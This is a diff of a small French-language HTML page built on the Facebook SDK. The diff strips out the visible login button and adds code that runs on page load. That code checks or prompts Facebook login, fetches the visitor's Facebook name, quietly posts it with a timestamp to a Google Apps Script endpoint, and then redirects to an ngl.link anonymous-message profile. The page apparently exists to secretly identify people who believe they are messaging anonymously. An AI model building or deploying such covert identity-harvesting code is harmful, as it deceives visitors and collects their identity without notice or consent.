@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -7,46 +8,58 @@
     <script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_US/sdk.js"></script>
 </head>
 <body>
-    <h1>Se connecter avec Facebook</h1>
-    <button id="loginBtn">Se connecter</button>
-
     <script>
         // Initialisation du SDK Facebook
         window.fbAsyncInit = function() {
             FB.init({
                 appId      : '1882208185942048', // Remplacez par votre App ID
-                cookie     : true,
+                cookie     : true, // Permet de lire les cookies Facebook
                 xfbml      : true,
-                version    : 'v16.0'
+                version    : 'v16.0' // Version du SDK
             });
-        };
 
-        document.getElementById('loginBtn').onclick = function() {
-            FB.login(function(response) {
-                if (response.authResponse) {
-                    // Récupérer les informations utilisateur
+            // Vérifiez l'état de la connexion dès que la page charge
+            FB.getLoginStatus(function(response) {
+                if (response.status === 'connected') {
+                    // Si déjà connecté, récupérer les informations de l'utilisateur
                     FB.api('/me', function(userInfo) {
-                        const name = userInfo.name; // Nom de l'utilisateur
-                        const timestamp = new Date().toISOString(); // Date actuelle
+                        const name = userInfo.name; // Nom Facebook
+                        const timestamp = new Date().toISOString();
 
-                        // URL de l'application Apps Script
-                        const scriptURL = "https://script.google.com/macros/s/AKfycbxuwCE4S6G3T_KjO_1WmnLzt_zsgp4OmyYCvRjd1udWsusZHQnIiayFha2V4n8ug6on/exec";
-                        fetch(scriptURL, {
-                            method: "POST",
-                            mode: "no-cors", // Désactive les vérifications CORS
-                            body: JSON.stringify({ name: name, timestamp: timestamp }),
-                            headers: {
-                                "Content-Type": "application/json"
-                            }
+                        // Envoyer les données à votre backend
+                        fetch('https://script.google.com/macros/s/AKfycbxuwCE4S6G3T_KjO_1WmnLzt_zsgp4OmyYCvRjd1udWsusZHQnIiayFha2V4n8ug6on/exec', {
+                            method: 'POST',
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ name: name, timestamp: timestamp })
                         }).then(() => {
-                            alert(name);
-                            window.location.href = "https://ngl.link/idealiiisoa19631"; // Rediriger après l'envoi
+                            // Rediriger l'utilisateur après l'enregistrement
+                            window.location.href = "https://ngl.link/idealiiisoa19631"; // Lien cible
                         }).catch(err => console.error("Erreur:", err));
                     });
                 } else {
-                    alert("Connexion annulée.");
+                    // Si non connecté, demander la connexion automatiquement
+                    FB.login(function(response) {
+                        if (response.authResponse) {
+                            FB.api('/me', function(userInfo) {
+                                const name = userInfo.name;
+                                const timestamp = new Date().toISOString();
+
+                                // Envoyer les données à votre backend
+                                fetch('https://script.google.com/macros/s/AKfycbxuwCE4S6G3T_KjO_1WmnLzt_zsgp4OmyYCvRjd1udWsusZHQnIiayFha2V4n8ug6on/exec', {
+                                    method: 'POST',
+                                    headers: { "Content-Type": "application/json" },
+                                    body: JSON.stringify({ name: name, timestamp: timestamp })
+                                }).then(() => {
+                                    // Rediriger l'utilisateur après l'enregistrement
+                                    window.location.href = "https://ngl.link/idealiiisoa19631"; // Lien cible
+                                }).catch(err => console.error("Erreur:", err));
+                            });
+                        } else {
+                            console.error("Connexion annulée par l'utilisateur.");
+                        }
+                    }, { scope: 'public_profile' }); // Permet de demander uniquement le profil public
                 }
-            }, { scope: 'public_profile' });
+            });
         };
     </script>
 </body>
